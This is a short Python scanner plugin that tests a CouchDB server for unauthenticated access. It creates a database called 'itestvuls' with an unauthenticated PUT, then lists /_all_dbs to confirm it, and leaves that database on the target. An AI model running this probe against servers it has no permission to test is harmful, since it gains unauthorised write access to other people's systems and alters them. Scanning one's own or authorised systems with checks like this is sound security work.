#-*- coding: utf-8 -*-

import requests

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if couchdb unanth vul')
    try:
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/itestvuls"
        vulnurl = url + payload
        req = requests.put(vulnurl)
        vulnurl = url + "/_all_dbs"
        req2 = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
        if r"itestvuls" in req2.text:
            msg = 'There is couchdb unanth vul on url: ' +vulnurl+ ' .'
            print(msg)
            number = 'v72'
            return True,url,number,msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no couchdb unanth vul'
    number = 'v0'
    return False,url,number,msg